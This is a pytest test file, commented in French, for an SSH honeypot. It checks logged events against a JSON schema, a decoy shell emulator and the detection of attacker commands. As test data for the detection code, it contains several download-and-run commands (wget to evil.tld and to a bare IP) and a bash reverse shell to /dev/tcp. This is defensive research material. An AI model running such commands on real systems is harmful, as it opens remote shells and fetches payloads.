"""Tests du honeypot SSH (EPIC-1).

Le test central (``test_all_event_types_conform_to_schema``) valide chaque type
d'événement émis par le honeypot contre ``docs/event.schema.json`` : c'est la
garantie que « les logs == le schéma ».
"""

import json
from pathlib import Path

import pytest
from commands import ShellState, run_command
from config import Credential, load_config
from events import build_event, normalize_ipv4
from jsonschema import Draft7Validator
from ssh.detection import (
    SessionProfiler,
    classify_command,
    detect_malware,
    is_escalation,
)

SCHEMA_PATH = Path(__file__).resolve().parents[3] / "docs" / "event.schema.json"


@pytest.fixture(scope="module")
def validator() -> Draft7Validator:
    schema = json.loads(SCHEMA_PATH.read_text(encoding="utf-8"))
    return Draft7Validator(schema, format_checker=Draft7Validator.FORMAT_CHECKER)


def _validate(validator: Draft7Validator, event: dict) -> None:
    errors = sorted(validator.iter_errors(event), key=lambda e: e.path)
    assert not errors, "\n".join(f"{list(e.path)}: {e.message}" for e in errors)


# --- conformité au schéma (US-01) -------------------------------------------
def test_all_event_types_conform_to_schema(validator: Draft7Validator) -> None:
    common = {"src_ip": "203.0.113.7", "src_port": 51234, "session_id": "sess-1"}

    events = [
        build_event(event_type="connection", payload={}, **common),
        build_event(
            event_type="auth_attempt",
            payload={"username": "admin", "password": "admin123", "auth_method": "password"},
            **common,
        ),
        build_event(
            event_type="auth_attempt",
            payload={
                "username": "root",
                "auth_method": "publickey",
                "key_fingerprint": "SHA256:abcdef0123456789",
            },
            **common,
        ),
        build_event(
            event_type="auth_success",
            payload={"username": "admin", "password": "admin123", "auth_method": "password"},
            **common,
        ),
        build_event(
            event_type="command",
            payload={"command": "wget http://evil.tld/x.sh"},
            classification=classify_command("wget http://evil.tld/x.sh"),
            **common,
        ),
        build_event(
            event_type="command",
            payload={"command": "sudo su", "target_user": "root"},
            classification=classify_command("sudo su"),
            **common,
        ),
        build_event(
            event_type="disconnection",
            payload={
                "command_count": 2,
                "commands": ["whoami", "sudo su"],
                "session_fingerprint": "deadbeef",
                "duration_ms": 4200,
            },
            classification=SessionProfiler(commands=["whoami", "sudo su"]).session_classification(),
            **common,
        ),
    ]

    for event in events:
        _validate(validator, event)


def test_auth_attempt_carries_required_fields(validator: Draft7Validator) -> None:
    event = build_event(
        event_type="auth_attempt",
        src_ip="198.51.100.4",
        src_port=2222,
        session_id="s",
        payload={"username": "ubuntu", "password": "ubuntu", "auth_method": "password"},
    )
    _validate(validator, event)
    # Champs exigés par US-27.
    assert event["src_ip"] and event["timestamp"]
    assert event["payload"]["username"] == "ubuntu"
    assert event["payload"]["password"] == "ubuntu"


def test_ipv4_normalization() -> None:
    assert normalize_ipv4("::ffff:192.0.2.10") == "192.0.2.10"
    assert normalize_ipv4("::1") == "127.0.0.1"
    assert normalize_ipv4("10.0.0.5") == "10.0.0.5"


# --- comptes restreints (US-03) ---------------------------------------------
def test_root_login_always_refused() -> None:
    config = load_config()
    config.allowed_credentials.append(Credential("root", "toor"))  # même listé...
    assert config.is_allowed("root", "toor") is False  # ...root reste refusé


def test_default_credentials_accepted() -> None:
    config = load_config()
    assert config.is_allowed("admin", "admin123") is True
    assert config.is_allowed("admin", "wrong") is False


# --- émulateur de commandes (US-02) -----------------------------------------
def test_fixed_command_outputs() -> None:
    state = ShellState(user="admin", cwd="/home/admin")
    assert run_command(state, "whoami") == "admin"
    assert run_command(state, "id").startswith("uid=1000(admin)")
    assert "Debian" in run_command(state, "uname -a")
    assert "bookworm" in run_command(state, "cat /etc/os-release")


def test_unknown_command_returns_not_found() -> None:
    state = ShellState()
    assert run_command(state, "foobar123") == "bash: foobar123: command not found"


def test_shell_never_leaks_real_env() -> None:
    state = ShellState(user="admin")
    out = run_command(state, "env")
    assert "USER=admin" in out and "HOSTNAME=prod-srv-01" in out


def test_prompt_reflects_user_then_root() -> None:
    state = ShellState(user="admin", cwd="/home/admin")
    assert state.prompt() == "admin@prod-srv-01:~$ "
    state.escalate_to_root()
    assert state.prompt() == "root@prod-srv-01:~# "
    assert run_command(state, "whoami") == "root"
    assert run_command(state, "pwd") == "/root"


# --- détection (US-04, US-05, US-06, US-07) ---------------------------------
def test_malware_detection_critical() -> None:
    for line in ("wget http://x/m", "curl -O http://x", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"):
        assert detect_malware(line)
        cls = classify_command(line)
        assert cls is not None and cls["severity"] == "critical"


def test_escalation_detection_high() -> None:
    for line in ("sudo su", "su root", "sudo -i"):
        assert is_escalation(line)
    cls = classify_command("sudo su")
    assert cls is not None and cls["severity"] == "high"


def test_benign_command_no_classification() -> None:
    assert classify_command("ls -la") is None


def test_bot_vs_human_profiling() -> None:
    # Exécution non interactive => bot.
    bot = SessionProfiler(interactive=False)
    assert bot.profile() == "bot"

    # Cadence très rapide et régulière => bot.
    fast = SessionProfiler()
    for i in range(6):
        fast.record(f"cmd{i}", i * 0.05)
    assert fast.profile() == "bot"

    # Cadence humaine espacée => human.
    human = SessionProfiler()
    for i, t in enumerate([0.0, 2.0, 5.5, 9.0]):
        human.record(f"cmd{i}", t)
    assert human.profile() == "human"


def test_fingerprint_is_stable_and_sequence_sensitive() -> None:
    a = SessionProfiler(commands=["whoami", "id", "sudo su"])
    b = SessionProfiler(commands=["whoami", "id", "sudo su"])
    c = SessionProfiler(commands=["id", "whoami", "sudo su"])
    assert a.fingerprint() == b.fingerprint()
    assert a.fingerprint() != c.fingerprint()


# --- réalisme du shell (ne pas être détecté comme honeypot) -----------------
def test_echo_expands_variables_and_strips_quotes() -> None:
    state = ShellState(user="admin", cwd="/home/admin")
    assert run_command(state, "echo $HOME") == "/home/admin"
    assert run_command(state, 'echo "user=$USER"') == "user=admin"
    assert run_command(state, "echo $UNKNOWN_VAR") == ""


def test_ls_is_path_aware() -> None:
    state = ShellState(user="admin", cwd="/home/admin")
    root = run_command(state, "ls /")
    assert "etc" in root and "usr" in root and "var" in root
    assert run_command(state, "ls /home") == "admin  deploy"
    # Le home reste cohérent quel que soit le cwd.
    assert "backup.tar.gz" in run_command(state, "ls /home/admin")


def test_standard_files_exist() -> None:
    state = ShellState()
    assert run_command(state, "cat /etc/hostname") == "prod-srv-01"
    assert "Debian" in run_command(state, "cat /etc/issue")
    assert "localhost" in run_command(state, "cat /etc/hosts")
    assert run_command(state, "cat /etc/shadow") == "cat: /etc/shadow: Permission denied"


def test_standard_tools_present() -> None:
    state = ShellState()
    assert run_command(state, "which python3") == "/usr/bin/python3"
    assert run_command(state, "python3 --version") == "Python 3.11.2"
    assert run_command(state, "nproc") == "4"
    assert run_command(state, "arch") == "x86_64"
    assert "10.0.2.15" in run_command(state, "ip a")
    assert "default via" in run_command(state, "ip route")
    assert run_command(state, "date")  # non vide, pas "command not found"


def test_sudo_l_is_bait() -> None:
    state = ShellState(user="admin")
    assert "(ALL : ALL) ALL" in run_command(state, "sudo -l")


def test_file_ops_succeed_silently() -> None:
    state = ShellState()
    assert run_command(state, "mkdir /srv/.x") == ""
    assert run_command(state, "touch /srv/.x/a") == ""
    assert run_command(state, "rm -f /srv/.x/a") == ""


def test_wget_is_simulated_not_missing() -> None:
    state = ShellState()
    out = run_command(state, "wget http://1.2.3.4/p.sh -O /srv/p.sh")
    assert "command not found" not in out
    assert "saved" in out


def test_unknown_command_still_not_found() -> None:
    state = ShellState()
    assert run_command(state, "definitelynotacommand") == (
        "bash: definitelynotacommand: command not found"
    )
